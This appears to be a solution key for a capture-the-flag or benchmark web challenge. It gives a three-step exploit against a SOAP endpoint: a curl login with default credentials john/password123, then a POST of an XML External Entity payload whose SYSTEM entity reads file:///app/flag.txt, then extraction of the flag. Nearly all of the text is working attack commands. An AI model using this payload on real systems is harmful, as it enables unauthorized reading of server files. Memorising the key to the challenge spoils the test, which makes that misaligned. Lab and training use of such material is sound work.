# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: XML External Entity (XXE) injection in a SOAP endpoint, reached
after logging in with documented default credentials. The XML parser resolves
external entities, so a `SYSTEM "file://..."` entity leaks local files.

1. **Log in** with default creds `john` / `password123` (save cookie):

   ```
   curl -s -c cookies.txt -X POST http://<target>/login -d "username=john&password=password123"
   ```

2. **POST an XXE payload** to the SOAP endpoint, defining an external entity that
   reads the flag file and referencing it in the account id:

   ```
   curl -s -b cookies.txt -X POST http://<target>/soap_service \
     -H "Content-Type: text/xml" \
     -d '<?xml version="1.0"?>
   <!DOCTYPE GetAccountInfoRequest [
     <!ENTITY xxe SYSTEM "file:///app/flag.txt">
   ]>
   <GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'
   ```

3. **Extract the flag** (`FLAG{...}`) from the SOAP response (reflected in the
   account id field) and report it verbatim.
